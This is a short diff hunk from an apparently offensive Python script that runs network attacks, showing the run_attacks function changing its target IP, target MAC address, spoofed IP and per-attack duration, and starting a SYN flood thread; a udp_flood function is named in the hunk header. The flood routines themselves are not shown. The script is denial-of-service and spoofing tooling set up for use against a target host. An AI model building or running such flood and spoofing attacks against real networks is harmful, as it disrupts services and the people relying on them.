@@ -84,11 +84,11 @@ def udp_flood(target_ip, target_port, duration):
 
 # Main function to run the attacks
 def run_attacks():
-    target_ip = "192.168.1.100"  # Replace with the target IP
+    target_ip = "192.168.1.101"  # Replace with the target IP
     target_port = 80  # Replace with the target port if applicable
-    target_mac = "00:11:22:33:44:55"  # Replace with the target MAC address if applicable
-    spoof_ip = "192.168.1.1"  # Replace with the IP to spoof if applicable
-    duration = 10  # Duration in seconds for each attack
+    target_mac = "00:11:22:33:44:51"  # Replace with the target MAC address if applicable
+    spoof_ip = "192.168.1.10"  # Replace with the IP to spoof if applicable
+    duration = 2  # Duration in seconds for each attack
 
     # Running SYN Flood attack
     syn_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
